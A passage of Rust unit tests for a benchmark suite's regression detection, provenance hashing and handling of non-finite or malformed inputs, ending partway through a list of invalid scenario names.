                cpu: "test".to_string(),
                memory_mb: 8192,
                os: "linux".to_string(),
            },
            runtime_versions: RuntimeVersions {
                franken_node: "0.1.0".to_string(),
                node: None,
                bun: None,
            },
            evidence_mode: BenchmarkEvidenceMode::FixtureOnly,
            profile: "strict".to_string(),
            security_controls: BenchmarkSecurityControls::fixture_only(),
            git_revision: Some("test-git-revision".to_string()),
            trace_id: "benchmark-suite-test-trace".to_string(),
            evidence_path: Some("artifacts/benchmark-suite/test-report.json".to_string()),
            sample_policy: fixture_sample_policy(1),
            events: Vec::new(),
            scenarios: vec![ScenarioResult {
                dimension: BenchmarkDimension::PerformanceUnderHardening,
                name: "cold_start_latency".to_string(),
                raw_value: 200.0,
                unit: "ms".to_string(),
                raw_samples: fixture_samples(200.0),
                confidence_interval: ConfidenceInterval {
                    lower: 195.0,
                    upper: 205.0,
                },
                score: 75,
                iterations: 5,
                variance_pct: 2.0,
            }],
            aggregate_score: 75,
            provenance_hash: String::new(),
        };

        let current = BenchmarkReport {
            scenarios: vec![ScenarioResult {
                raw_value: 350.0, // 75% increase in latency
                ..baseline.scenarios[0].clone()
            }],
            ..baseline.clone()
        };

        let findings = detect_regressions(&baseline, &current, 10.0);
        assert_eq!(findings.len(), 1, "Should detect one regression");
        assert!(findings[0].change_pct > 10.0);

        let events = regression_events(&current, &findings);
        assert_eq!(events.len(), 1);
        assert_eq!(events[0].code, BS_REGRESSION_DETECTED);
        assert_eq!(events[0].scenario_id.as_deref(), Some("cold_start_latency"));
        assert_eq!(events[0].trace_id, "benchmark-suite-test-trace");
    }

    #[test]
    fn test_regression_detection_nan_threshold_fails_closed() {
        let baseline = BenchmarkReport {
            suite_version: SUITE_VERSION.to_string(),
            scoring_formula_version: SCORING_FORMULA_VERSION.to_string(),
            timestamp_utc: "2026-02-20T00:00:00Z".to_string(),
            hardware_profile: HardwareProfile {
                cpu: "test".to_string(),
                memory_mb: 8192,
                os: "linux".to_string(),
            },
            runtime_versions: RuntimeVersions {
                franken_node: "0.1.0".to_string(),
                node: None,
                bun: None,
            },
            evidence_mode: BenchmarkEvidenceMode::FixtureOnly,
            profile: "strict".to_string(),
            security_controls: BenchmarkSecurityControls::fixture_only(),
            git_revision: Some("test-git-revision".to_string()),
            trace_id: "benchmark-suite-test-trace".to_string(),
            evidence_path: Some("artifacts/benchmark-suite/test-report.json".to_string()),
            sample_policy: fixture_sample_policy(1),
            events: Vec::new(),
            scenarios: vec![ScenarioResult {
                dimension: BenchmarkDimension::PerformanceUnderHardening,
                name: "cold_start_latency".to_string(),
                raw_value: 200.0,
                unit: "ms".to_string(),
                raw_samples: fixture_samples(200.0),
                confidence_interval: ConfidenceInterval {
                    lower: 195.0,
                    upper: 205.0,
                },
                score: 75,
                iterations: 5,
                variance_pct: 2.0,
            }],
            aggregate_score: 75,
            provenance_hash: String::new(),
        };

        let current = BenchmarkReport {
            scenarios: vec![ScenarioResult {
                raw_value: 350.0,
                ..baseline.scenarios[0].clone()
            }],
            ..baseline.clone()
        };

        let findings = detect_regressions(&baseline, &current, f64::NAN);
        assert_eq!(findings.len(), 1);
    }

    #[test]
    fn test_regression_detection_infinite_threshold_fails_closed() {
        let baseline = BenchmarkReport {
            suite_version: SUITE_VERSION.to_string(),
            scoring_formula_version: SCORING_FORMULA_VERSION.to_string(),
            timestamp_utc: "2026-02-20T00:00:00Z".to_string(),
            hardware_profile: HardwareProfile {
                cpu: "test".to_string(),
                memory_mb: 8192,
                os: "linux".to_string(),
            },
            runtime_versions: RuntimeVersions {
                franken_node: "0.1.0".to_string(),
                node: None,
                bun: None,
            },
            evidence_mode: BenchmarkEvidenceMode::FixtureOnly,
            profile: "strict".to_string(),
            security_controls: BenchmarkSecurityControls::fixture_only(),
            git_revision: Some("test-git-revision".to_string()),
            trace_id: "benchmark-suite-test-trace".to_string(),
            evidence_path: Some("artifacts/benchmark-suite/test-report.json".to_string()),
            sample_policy: fixture_sample_policy(1),
            events: Vec::new(),
            scenarios: vec![ScenarioResult {
                dimension: BenchmarkDimension::PerformanceUnderHardening,
                name: "cold_start_latency".to_string(),
                raw_value: 200.0,
                unit: "ms".to_string(),
                raw_samples: fixture_samples(200.0),
                confidence_interval: ConfidenceInterval {
                    lower: 195.0,
                    upper: 205.0,
                },
                score: 75,
                iterations: 5,
                variance_pct: 2.0,
            }],
            aggregate_score: 75,
            provenance_hash: String::new(),
        };

        let current = BenchmarkReport {
            scenarios: vec![ScenarioResult {
                raw_value: 350.0,
                ..baseline.scenarios[0].clone()
            }],
            ..baseline.clone()
        };

        let findings = detect_regressions(&baseline, &current, f64::INFINITY);
        assert_eq!(findings.len(), 1);
    }

    #[test]
    fn test_events_emitted_during_run() {
        let config = SuiteConfig::with_defaults();
        let mut suite = BenchmarkSuite::new(config);
        suite.add_scenario(ScenarioDefinition {
            dimension: BenchmarkDimension::PerformanceUnderHardening,
            name: "test_scenario".to_string(),
            unit: "ms".to_string(),
            iterations: 5,
            warmup_iterations: 0,
            sandbox_required: false,
            scoring: ScoringConfig::lower_is_better(1.0, 10.0),
        });

        let mut measurements = BTreeMap::new();
        measurements.insert("test_scenario".to_string(), vec![5.0; 5]);
        let report = suite
            .run(&measurements)
            .expect("finite benchmark data should run");

        let event_codes: Vec<&str> = suite.events().iter().map(|e| e.code.as_str()).collect();
        assert!(event_codes.contains(&BS_SUITE_INITIALIZED));
        assert!(event_codes.contains(&BS_SCENARIO_STARTED));
        assert!(event_codes.contains(&BS_MEASUREMENT_RECORDED));
        assert!(event_codes.contains(&BS_SCORE_COMPUTED));
        assert!(event_codes.contains(&BS_SCENARIO_COMPLETED));
        assert!(event_codes.contains(&BS_SUITE_COMPLETED));
        assert_eq!(report.events.as_slice(), suite.events());
        assert!(suite.events().iter().all(|event| {
            event.trace_id == "benchmark-suite-test-trace"
                && event.profile == "strict"
                && event.evidence_path.as_deref()
                    == Some("artifacts/benchmark-suite/test-report.json")
        }));
        assert!(
            suite
                .events()
                .iter()
                .any(|event| event.scenario_id.as_deref() == Some("test_scenario"))
        );
        assert_eq!(report.sample_policy.total_sample_count, 5);
    }

    #[test]
    fn test_fixture_mode_emits_quarantine_event() {
        let config = SuiteConfig::with_defaults();
        let report = run_default_suite_with_config_and_mode(
            config,
            Some("cold_start_latency"),
            BenchmarkEvidenceMode::FixtureOnly,
        )
        .expect("fixture run should succeed");

        assert!(
            report
                .events
                .iter()
                .any(|event| event.code == BS_FIXTURE_MODE_USED)
        );
        assert_eq!(report.evidence_mode, BenchmarkEvidenceMode::FixtureOnly);
        assert!(report.security_controls.fixture_mode);
    }

    #[test]
    fn test_failed_scenario_emits_failure_event() {
        let config = SuiteConfig::with_defaults();
        let mut suite = BenchmarkSuite::new(config);
        let scenario = ScenarioDefinition {
            dimension: BenchmarkDimension::PerformanceUnderHardening,
            name: "test_scenario".to_string(),
            unit: "ms".to_string(),
            iterations: 1,
            warmup_iterations: 0,
            sandbox_required: false,
            scoring: ScoringConfig::lower_is_better(1.0, 10.0),
        };

        let err = suite
            .execute_scenario_samples(&scenario, &[])
            .expect_err("empty samples must fail");

        assert!(matches!(err, BenchRunError::EmptyMeasurements { .. }));
        assert!(suite.events().iter().any(|event| {
            event.code == BS_SCENARIO_FAILED
                && event.scenario_id.as_deref() == Some("test_scenario")
        }));
    }

    #[test]
    fn test_provenance_hash_deterministic() {
        let report = BenchmarkReport {
            suite_version: SUITE_VERSION.to_string(),
            scoring_formula_version: SCORING_FORMULA_VERSION.to_string(),
            timestamp_utc: "2026-02-21T00:00:00Z".to_string(),
            hardware_profile: HardwareProfile {
                cpu: "test".to_string(),
                memory_mb: 8192,
                os: "linux".to_string(),
            },
            runtime_versions: RuntimeVersions {
                franken_node: "0.1.0".to_string(),
                node: None,
                bun: None,
            },
            evidence_mode: BenchmarkEvidenceMode::FixtureOnly,
            profile: "strict".to_string(),
            security_controls: BenchmarkSecurityControls::fixture_only(),
            git_revision: Some("test-git-revision".to_string()),
            trace_id: "benchmark-suite-test-trace".to_string(),
            evidence_path: Some("artifacts/benchmark-suite/test-report.json".to_string()),
            sample_policy: fixture_sample_policy(0),
            events: Vec::new(),
            scenarios: vec![],
            aggregate_score: 0,
            provenance_hash: String::new(),
        };

        let hash1 = report.compute_provenance_hash();
        let hash2 = report.compute_provenance_hash();
        assert_eq!(hash1, hash2);
        assert!(hash1.starts_with("sha256:"));
    }

    #[test]
    fn test_default_scoring_known_scenarios() {
        assert!(default_scoring("cold_start_latency").is_some());
        assert!(default_scoring("p99_request_latency").is_some());
        assert!(default_scoring("extension_overhead_ratio").is_some());
        assert!(default_scoring("migration_scanner_throughput").is_some());
        assert!(default_scoring("lockstep_harness_throughput").is_some());
        assert!(default_scoring("quarantine_propagation_latency").is_some());
        assert!(default_scoring("trust_card_materialization").is_some());
        assert!(default_scoring("unknown_metric").is_none());
    }

    #[test]
    fn test_aggregate_score_computation() {
        let config = SuiteConfig::with_defaults();
        let mut suite = BenchmarkSuite::new(config);
        suite.add_scenario(ScenarioDefinition {
            dimension: BenchmarkDimension::PerformanceUnderHardening,
            name: "cold_start_latency".to_string(),
            unit: "ms".to_string(),
            iterations: 5,
            warmup_iterations: 0,
            sandbox_required: true,
            scoring: ScoringConfig::lower_is_better(100.0, 500.0),
        });
        suite.add_scenario(ScenarioDefinition {
            dimension: BenchmarkDimension::MigrationSpeed,
            name: "migration_scanner_throughput".to_string(),
            unit: "fixtures/s".to_string(),
            iterations: 5,
            warmup_iterations: 0,
            sandbox_required: false,
            scoring: ScoringConfig::higher_is_better(1000.0, 200.0),
        });

        let mut measurements = BTreeMap::new();
        // cold_start: 100ms = ideal = score 100
        measurements.insert("cold_start_latency".to_string(), vec![100.0; 5]);
        // migration: 1000 fixtures/s = ideal = score 100
        measurements.insert("migration_scanner_throughput".to_string(), vec![1000.0; 5]);

        let report = suite
            .run(&measurements)
            .expect("finite benchmark data should run");
        assert_eq!(report.aggregate_score, 100);
    }

    #[test]
    fn test_execute_scenario_rejects_non_finite_measurements() {
        let config = SuiteConfig::with_defaults();
        let mut suite = BenchmarkSuite::new(config);
        let scenario = ScenarioDefinition {
            dimension: BenchmarkDimension::PerformanceUnderHardening,
            name: "test_scenario".to_string(),
            unit: "ms".to_string(),
            iterations: 2,
            warmup_iterations: 0,
            sandbox_required: true,
            scoring: ScoringConfig::lower_is_better(1.0, 10.0),
        };

        let err = suite
            .execute_scenario(&scenario, &[1.0, f64::NAN])
            .expect_err("NaN input must fail closed");
        assert!(matches!(err, BenchRunError::NonFiniteMeasurement { .. }));
    }

    #[test]
    fn test_run_rejects_empty_measurements() {
        let config = SuiteConfig::with_defaults();
        let mut suite = BenchmarkSuite::new(config);
        suite.add_scenario(ScenarioDefinition {
            dimension: BenchmarkDimension::PerformanceUnderHardening,
            name: "test_scenario".to_string(),
            unit: "ms".to_string(),
            iterations: 1,
            warmup_iterations: 0,
            sandbox_required: true,
            scoring: ScoringConfig::lower_is_better(1.0, 10.0),
        });

        let mut measurements = BTreeMap::new();
        measurements.insert("test_scenario".to_string(), Vec::new());

        let err = suite
            .run(&measurements)
            .expect_err("empty measurement sets must fail closed");
        assert!(matches!(err, BenchRunError::EmptyMeasurements { .. }));
    }

    #[test]
    fn test_to_canonical_json_rejects_non_finite_report() {
        let report = BenchmarkReport {
            suite_version: SUITE_VERSION.to_string(),
            scoring_formula_version: SCORING_FORMULA_VERSION.to_string(),
            timestamp_utc: "2026-02-21T00:00:00Z".to_string(),
            hardware_profile: HardwareProfile {
                cpu: "test".to_string(),
                memory_mb: 8192,
                os: "linux".to_string(),
            },
            runtime_versions: RuntimeVersions {
                franken_node: "0.1.0".to_string(),
                node: None,
                bun: None,
            },
            evidence_mode: BenchmarkEvidenceMode::FixtureOnly,
            profile: "strict".to_string(),
            security_controls: BenchmarkSecurityControls::fixture_only(),
            git_revision: Some("test-git-revision".to_string()),
            trace_id: "benchmark-suite-test-trace".to_string(),
            evidence_path: Some("artifacts/benchmark-suite/test-report.json".to_string()),
            sample_policy: fixture_sample_policy(1),
            events: Vec::new(),
            scenarios: vec![ScenarioResult {
                dimension: BenchmarkDimension::PerformanceUnderHardening,
                name: "cold_start_latency".to_string(),
                raw_value: f64::INFINITY,
                unit: "ms".to_string(),
                raw_samples: vec![RawMeasurement::fixture(
                    0,
                    f64::INFINITY,
                    "2026-02-21T00:00:00Z",
                )],
                confidence_interval: ConfidenceInterval {
                    lower: 1.0,
                    upper: 2.0,
                },
                score: 0,
                iterations: 1,
                variance_pct: 0.0,
            }],
            aggregate_score: 0,
            provenance_hash: String::new(),
        };

        assert!(
            to_canonical_json(&report).is_err(),
            "non-finite reports must return an error instead of empty JSON"
        );
    }

    #[test]
    fn test_regression_finding_display() {
        let finding = RegressionFinding {
            scenario_name: "cold_start_latency".to_string(),
            dimension: BenchmarkDimension::PerformanceUnderHardening,
            current_value: 300.0,
            baseline_value: 200.0,
            change_pct: 50.0,
            threshold_pct: 10.0,
        };
        let display = format!("{finding}");
        assert!(display.contains("cold_start_latency"));
        assert!(display.contains("50.0%"));
    }

    #[test]
    fn test_deterministic_measurements_repeatable() {
        let scenario = ScenarioDefinition {
            dimension: BenchmarkDimension::PerformanceUnderHardening,
            name: "cold_start_latency".to_string(),
            unit: "ms".to_string(),
            iterations: 5,
            warmup_iterations: 0,
            sandbox_required: true,
            scoring: ScoringConfig::lower_is_better(100.0, 500.0),
        };

        let first = deterministic_measurements_for_scenario(&scenario);
        let second = deterministic_measurements_for_scenario(&scenario);
        assert_eq!(first, second);
        assert_eq!(first.len(), 5);
    }

    #[test]
    fn test_run_default_suite_with_filter_subset() {
        let config = SuiteConfig::with_defaults();
        let report = run_default_suite_with_config_and_mode(
            config,
            Some("cold_start_latency,migration_scanner_throughput"),
            BenchmarkEvidenceMode::FixtureOnly,
        )
        .expect("subset filter should run");

        assert_eq!(report.scenarios.len(), 2);
        let names = report
            .scenarios
            .iter()
            .map(|scenario| scenario.name.as_str())
            .collect::<BTreeSet<_>>();
        assert!(names.contains("cold_start_latency"));
        assert!(names.contains("migration_scanner_throughput"));
    }

    #[test]
    fn test_run_default_suite_filter_unknown_fails() {
        let config = SuiteConfig::with_defaults();
        let err = run_default_suite_with_config(config, Some("does_not_exist"))
            .expect_err("unknown scenarios should fail");
        assert!(matches!(err, BenchRunError::UnknownScenario { .. }));
    }

    #[test]
    fn test_run_default_suite_is_deterministic_with_fixed_config() {
        let config = SuiteConfig::with_defaults();
        let first = run_default_suite_with_config_and_mode(
            config.clone(),
            None,
            BenchmarkEvidenceMode::FixtureOnly,
        )
        .expect("first run");
        let second = run_default_suite_with_config_and_mode(
            config,
            None,
            BenchmarkEvidenceMode::FixtureOnly,
        )
        .expect("second run");

        assert_eq!(first.aggregate_score, second.aggregate_score);
        assert_eq!(first.scenarios, second.scenarios);
        assert_eq!(first.provenance_hash, second.provenance_hash);
    }

    #[test]
    fn test_render_human_summary_includes_provenance() {
        let config = SuiteConfig::with_defaults();
        let report = run_default_suite_with_config_and_mode(
            config,
            Some("cold_start_latency"),
            BenchmarkEvidenceMode::FixtureOnly,
        )
        .expect("single scenario should run");
        let summary = render_human_summary(&report);
        assert!(summary.contains("benchmark suite:"));
        assert!(summary.contains("cold_start_latency"));
        assert!(summary.contains("provenance_hash="));
    }

    // ── Edge case tests for mathematical functions with is_finite guards ──

    #[test]
    fn test_score_handles_nan_infinity_inputs() {
        let config = ScoringConfig::lower_is_better(100.0, 200.0);

        // Test NaN input
        assert_eq!(config.score(f64::NAN), 0);

        // Test infinity inputs
        assert_eq!(config.score(f64::INFINITY), 0);
        assert_eq!(config.score(f64::NEG_INFINITY), 100);

        // Test normal inputs still work
        assert_eq!(config.score(100.0), 100);
        assert_eq!(config.score(150.0), 50);
        assert_eq!(config.score(200.0), 0);
    }

    #[test]
    fn test_score_handles_extreme_config_values() {
        // Test with extreme ideal/threshold values that might cause overflow
        let config = ScoringConfig::lower_is_better(f64::MAX / 2.0, f64::MAX);
        assert_eq!(config.score(f64::MAX), 0);

        // Test division by zero scenario (ideal == threshold)
        let config = ScoringConfig::lower_is_better(100.0, 100.0);
        assert_eq!(config.score(99.0), 100);
        assert_eq!(config.score(101.0), 0);
    }

    #[test]
    fn test_confidence_interval_handles_nan_infinity() {
        // Test with NaN values in input
        let values_with_nan = vec![1.0, 2.0, f64::NAN, 4.0, 5.0];
        let ci = confidence_interval_95(&values_with_nan);
        // Should handle gracefully (mean() and std_dev() have their own guards)
        assert!(ci.lower.is_finite() || ci.lower == 0.0);
        assert!(ci.upper.is_finite() || ci.upper == 0.0);

        // Test with infinity values
        let values_with_inf = vec![1.0, 2.0, f64::INFINITY, 4.0, 5.0];
        let ci = confidence_interval_95(&values_with_inf);
        // Should fallback to mean when margin is not finite
        assert!(ci.lower.is_finite() || ci.lower == 0.0);
        assert!(ci.upper.is_finite() || ci.upper == 0.0);

        // Test with very small values that might cause precision issues
        let tiny_values = vec![1e-300, 2e-300, 3e-300];
        let ci = confidence_interval_95(&tiny_values);
        assert!(ci.lower.is_finite());
        assert!(ci.upper.is_finite());
    }

    #[test]
    fn test_mean_handles_extreme_values() {
        // Test with very large values that might overflow
        let large_values = vec![f64::MAX / 2.0, f64::MAX / 2.0];
        let result = mean(&large_values);
        assert!(result.is_finite());

        // Test with mix of large and small values
        let mixed_values = vec![f64::MAX / 4.0, 1.0, f64::MAX / 4.0];
        let result = mean(&mixed_values);
        assert!(result.is_finite() || result == 0.0);
    }

    #[test]
    fn test_std_dev_handles_extreme_values() {
        // Test with identical large values (should have zero std dev)
        let identical_large = vec![f64::MAX / 4.0; 5];
        let result = std_dev(&identical_large);
        assert!(result.is_finite());
        assert!(result.abs() < f64::EPSILON);

        // Test with very spread out values
        let spread_values = vec![f64::MIN_POSITIVE, f64::MAX / 2.0];
        let result = std_dev(&spread_values);
        assert!(result.is_finite() || result == 0.0);
    }

    #[test]
    fn test_coefficient_of_variation_handles_zero_mean() {
        // Test when mean is zero
        let zero_mean = vec![-1.0, 0.0, 1.0];
        let result = coefficient_of_variation(&zero_mean);
        assert!(result.is_finite());
        assert_eq!(result, 0.0);

        // Test when mean is very close to zero
        let near_zero_mean = vec![1e-15, -1e-15, 0.0];
        let result = coefficient_of_variation(&near_zero_mean);
        assert!(result.is_finite());
        assert_eq!(result, 0.0);
    }

    fn hash_matches(left: &str, right: &str) -> bool {
        crate::security::constant_time::ct_eq_bytes(left.as_bytes(), right.as_bytes())
    }

    fn signed_report_fixture() -> BenchmarkReport {
        let mut report = BenchmarkReport {
            suite_version: SUITE_VERSION.to_string(),
            scoring_formula_version: SCORING_FORMULA_VERSION.to_string(),
            timestamp_utc: "2026-02-21T00:00:00Z".to_string(),
            hardware_profile: HardwareProfile {
                cpu: "fixture-cpu".to_string(),
                memory_mb: 16_384,
                os: "linux".to_string(),
            },
            runtime_versions: RuntimeVersions {
                franken_node: "0.1.0".to_string(),
                node: Some("22.0.0".to_string()),
                bun: Some("1.1.0".to_string()),
            },
            evidence_mode: BenchmarkEvidenceMode::FixtureOnly,
            profile: "strict".to_string(),
            security_controls: BenchmarkSecurityControls::fixture_only(),
            git_revision: Some("test-git-revision".to_string()),
            trace_id: "benchmark-suite-test-trace".to_string(),
            evidence_path: Some("artifacts/benchmark-suite/test-report.json".to_string()),
            sample_policy: fixture_sample_policy(1),
            events: Vec::new(),
            scenarios: vec![ScenarioResult {
                dimension: BenchmarkDimension::PerformanceUnderHardening,
                name: "cold_start_latency".to_string(),
                raw_value: 125.0,
                unit: "ms".to_string(),
                raw_samples: fixture_samples(125.0),
                confidence_interval: ConfidenceInterval {
                    lower: 123.0,
                    upper: 127.0,
                },
                score: 94,
                iterations: 5,
                variance_pct: 1.1,
            }],
            aggregate_score: 94,
            provenance_hash: String::new(),
        };
        report.provenance_hash = report.compute_provenance_hash();
        report
    }

    #[test]
    fn test_deterministic_measurements_zero_iterations_still_repeat() {
        let scenario = ScenarioDefinition {
            dimension: BenchmarkDimension::ReplayDeterminism,
            name: "zero_iteration_replay".to_string(),
            unit: "percent".to_string(),
            iterations: 0,
            warmup_iterations: 0,
            sandbox_required: false,
            scoring: ScoringConfig::higher_is_better(100.0, 90.0),
        };

        let first = deterministic_measurements_for_scenario(&scenario);
        let second = deterministic_measurements_for_scenario(&scenario);

        assert_eq!(first, second);
        assert_eq!(first.len(), 1);
        assert!(first.iter().all(|value| value.is_finite()));
    }

    #[test]
    fn test_deterministic_measurements_are_bound_to_scenario_name() {
        let mut scenario = ScenarioDefinition {
            dimension: BenchmarkDimension::ReplayDeterminism,
            name: "replay_bit_identity_rate".to_string(),
            unit: "percent".to_string(),
            iterations: 5,
            warmup_iterations: 0,
            sandbox_required: false,
            scoring: ScoringConfig::higher_is_better(100.0, 90.0),
        };
        let replay_measurements = deterministic_measurements_for_scenario(&scenario);

        scenario.name = "adversarial_pass_rate".to_string();
        let adversarial_measurements = deterministic_measurements_for_scenario(&scenario);

        assert_ne!(replay_measurements, adversarial_measurements);
        assert!(replay_measurements.iter().all(|value| value.is_finite()));
        assert!(
            adversarial_measurements
                .iter()
                .all(|value| value.is_finite())
        );
    }

    #[test]
    fn test_default_suite_duplicate_filter_is_deterministic() {
        let config = SuiteConfig::with_defaults();
        let first = run_default_suite_with_config_and_mode(
            config.clone(),
            Some("cold_start_latency,cold_start_latency"),
            BenchmarkEvidenceMode::FixtureOnly,
        )
        .expect("duplicate filter should dedupe");
        let second = run_default_suite_with_config_and_mode(
            config,
            Some("cold_start_latency,cold_start_latency"),
            BenchmarkEvidenceMode::FixtureOnly,
        )
        .expect("duplicate filter should dedupe deterministically");

        assert_eq!(first.scenarios.len(), 1);
        assert_eq!(second.scenarios.len(), 1);
        assert_eq!(first.scenarios, second.scenarios);
        assert!(hash_matches(
            &first.provenance_hash,
            &second.provenance_hash
        ));
    }

    #[test]
    fn test_default_suite_measured_mode_records_raw_samples_and_security_metadata() {
        let config = SuiteConfig::with_defaults();
        let report = run_default_suite_with_config(config, Some("secure-extension-heavy"))
            .expect("measured default suite should run");

        assert_eq!(report.evidence_mode, BenchmarkEvidenceMode::Measured);
        assert_eq!(report.profile, "strict");
        assert!(!report.security_controls.fixture_mode);
        assert!(report.security_controls.sandbox_enforced);
        assert!(report.security_controls.trust_verification_enabled);
        assert_eq!(report.scenarios.len(), 1);
        assert_eq!(report.scenarios[0].raw_samples.len(), 5);
        assert!(
            report.scenarios[0]
                .raw_samples
                .iter()
                .all(|sample| sample.source == "measured_product_workload")
        );
    }

    #[test]
    fn test_fixture_mode_is_explicitly_quarantined() {
        let config = SuiteConfig::with_defaults();
        let report = run_default_suite_with_config_and_mode(
            config,
            Some("secure-extension-heavy"),
            BenchmarkEvidenceMode::FixtureOnly,
        )
        .expect("fixture suite should run");

        assert_eq!(report.evidence_mode, BenchmarkEvidenceMode::FixtureOnly);
        assert!(report.security_controls.fixture_mode);
        assert!(
            report.scenarios[0]
                .raw_samples
                .iter()
                .all(|sample| sample.source == "fixture_only_deterministic")
        );
    }

    #[test]
    fn test_measured_mode_rejects_disabled_security_controls() {
        let scenario = ScenarioDefinition {
            dimension: BenchmarkDimension::PerformanceUnderHardening,
            name: "secure-extension-heavy".to_string(),
            unit: "ms".to_string(),
            iterations: 5,
            warmup_iterations: 0,
            sandbox_required: true,
            scoring: ScoringConfig::lower_is_better(250.0, 1000.0),
        };

        let err = measured_samples_for_scenario(
            &scenario,
            &BenchmarkSecurityControls {
                sandbox_enforced: false,
                trust_verification_enabled: true,
                revocation_freshness_enforced: true,
                fixture_mode: false,
            },
        )
        .expect_err("disabled sandbox must fail closed");

        assert!(matches!(
            err,
            BenchRunError::SecurityControlsDisabled { .. }
        ));
    }

    #[test]
    fn test_measured_mode_rejects_insufficient_samples() {
        let scenario = ScenarioDefinition {
            dimension: BenchmarkDimension::PerformanceUnderHardening,
            name: "secure-extension-heavy".to_string(),
            unit: "ms".to_string(),
            iterations: 2,
            warmup_iterations: 0,
            sandbox_required: true,
            scoring: ScoringConfig::lower_is_better(250.0, 1000.0),
        };

        let err =
            measured_samples_for_scenario(&scenario, &BenchmarkSecurityControls::measured_secure())
                .expect_err("measured mode must enforce the sample floor");

        assert!(matches!(err, BenchRunError::InsufficientSamples { .. }));
    }

    #[test]
    fn test_execute_scenario_rejects_positive_infinity_measurement() {
        let config = SuiteConfig::with_defaults();
        let mut suite = BenchmarkSuite::new(config);
        let scenario = ScenarioDefinition {
            dimension: BenchmarkDimension::ContainmentLatency,
            name: "quarantine_propagation_latency".to_string(),
            unit: "ms".to_string(),
            iterations: 3,
            warmup_iterations: 0,
            sandbox_required: true,
            scoring: ScoringConfig::lower_is_better(100.0, 2000.0),
        };

        let err = suite
            .execute_scenario(&scenario, &[100.0, f64::INFINITY, 101.0])
            .expect_err("infinite input must fail closed");

        assert!(matches!(err, BenchRunError::NonFiniteMeasurement { .. }));
    }

    #[test]
    fn test_to_canonical_json_rejects_non_finite_confidence_upper() {
        let mut report = signed_report_fixture();
        report.scenarios[0].confidence_interval.upper = f64::INFINITY;
        report.provenance_hash = report.compute_provenance_hash();

        let err = to_canonical_json(&report).expect_err("infinite CI upper must fail closed");

        assert!(matches!(
            err,
            BenchRunError::NonFiniteReportValue { detail } if detail.contains("confidence_interval.upper")
        ));
    }

    #[test]
    fn test_to_canonical_json_rejects_non_finite_variance() {
        let mut report = signed_report_fixture();
        report.scenarios[0].variance_pct = f64::NAN;
        report.provenance_hash = report.compute_provenance_hash();

        let err = to_canonical_json(&report).expect_err("NaN variance must fail closed");

        assert!(matches!(
            err,
            BenchRunError::NonFiniteReportValue { detail } if detail.contains("variance_pct")
        ));
    }

    #[test]
    fn test_signed_report_hash_matches_canonical_content() {
        let report = signed_report_fixture();
        let recomputed = report.compute_provenance_hash();
        let json = to_canonical_json(&report).expect("signed report should serialize");

        assert!(hash_matches(&report.provenance_hash, &recomputed));
        assert!(json.contains("\"provenance_hash\""));
        assert!(json.contains(&report.provenance_hash));
    }

    #[test]
    fn test_signed_report_integrity_detects_raw_value_tamper() {
        let report = signed_report_fixture();
        let mut tampered = report.clone();
        tampered.scenarios[0].raw_value = tampered.scenarios[0].raw_value + 1.0;

        let recomputed = tampered.compute_provenance_hash();

        assert!(!hash_matches(&report.provenance_hash, &recomputed));
    }

    #[test]
    fn test_signed_report_integrity_detects_runtime_version_tamper() {
        let report = signed_report_fixture();
        let mut tampered = report.clone();
        tampered.runtime_versions.node = Some("23.0.0".to_string());

        let recomputed = tampered.compute_provenance_hash();

        assert!(!hash_matches(&report.provenance_hash, &recomputed));
    }

    #[test]
    fn test_signed_report_hash_field_is_not_self_referential() {
        let report = signed_report_fixture();
        let mut resigned = report.clone();
        resigned.provenance_hash = "sha256:previous-signature-placeholder".to_string();

        let original_recomputed = report.compute_provenance_hash();
        let resigned_recomputed = resigned.compute_provenance_hash();

        assert!(hash_matches(&original_recomputed, &resigned_recomputed));
    }

    // ── Negative-path tests for edge cases and invalid inputs ──────────

    #[test]
    fn negative_scoring_config_with_nan_and_infinite_values_handles_safely() {
        // Test ScoringConfig with NaN values
        let nan_config = ScoringConfig {
            ideal: f64::NAN,
            threshold: 100.0,
            lower_is_better: true,
        };

        // Scoring with NaN should return 0 (safe fallback)
        assert_eq!(nan_config.score(50.0), 0);
        assert_eq!(nan_config.score(f64::NAN), 0);

        // Test with infinite values
        let inf_config = ScoringConfig {
            ideal: 10.0,
            threshold: f64::INFINITY,
            lower_is_better: true,
        };

        // Should handle infinite threshold gracefully
        let score = inf_config.score(50.0);
        assert!(score <= 100, "Score should be bounded: {}", score);

        // Test with negative infinity
        let neg_inf_config = ScoringConfig {
            ideal: f64::NEG_INFINITY,
            threshold: 100.0,
            lower_is_better: false,
        };

        assert_eq!(
            neg_inf_config.score(50.0),
            0,
            "Negative infinity should result in 0 score"
        );
    }

    #[test]
    fn negative_scoring_config_with_identical_ideal_and_threshold_boundary_cases() {
        // Test when ideal equals threshold (division by zero case)
        let identical_config = ScoringConfig {
            ideal: 50.0,
            threshold: 50.0,
            lower_is_better: true,
        };

        // Should handle division by zero case
        assert_eq!(
            identical_config.score(50.0),
            100,
            "At ideal value should score 100"
        );
        assert_eq!(
            identical_config.score(49.0),
            100,
            "Below ideal should score 100"
        );
        assert_eq!(
            identical_config.score(51.0),
            0,
            "Above ideal should score 0"
        );

        // Test higher-is-better with identical values
        let identical_higher_config = ScoringConfig {
            ideal: 100.0,
            threshold: 100.0,
            lower_is_better: false,
        };

        assert_eq!(identical_higher_config.score(100.0), 100);
        assert_eq!(identical_higher_config.score(99.0), 0);
        assert_eq!(identical_higher_config.score(101.0), 100);
    }

    #[test]
    fn negative_benchmark_dimension_serialization_with_malformed_json() {
        // Test BenchmarkDimension deserialization with invalid JSON
        let invalid_json_cases = vec![
            "null",                          // Wrong type
            "\"unknown_dimension\"",         // Unknown variant
            "\"COMPATIBILITY_CORRECTNESS\"", // Wrong case
            "\"compatibility-correctness\"", // Wrong delimiter
            "42",                            // Numeric instead of string
            "\"\"",                          // Empty string
        ];

        for invalid_json in invalid_json_cases {
            let result: Result<BenchmarkDimension, _> = serde_json::from_str(invalid_json);
            assert!(
                result.is_err(),
                "Should reject invalid JSON: {}",
                invalid_json
            );
        }

        // Test that valid serialization still works
        let dimension = BenchmarkDimension::CompatibilityCorrectness;
        let serialized = serde_json::to_string(&dimension).unwrap();
        assert_eq!(serialized, "\"compatibility_correctness\"");

        let deserialized: BenchmarkDimension = serde_json::from_str(&serialized).unwrap();
        assert_eq!(deserialized, dimension);
    }

    #[test]
    fn negative_default_scoring_with_problematic_scenario_names() {
        // Test default_scoring with various problematic input strings
        let problematic_names = vec![
            "",                                                       // Empty string
            "   ",                                                    // Whitespace only
            "\0null_terminated",                                      // Null byte
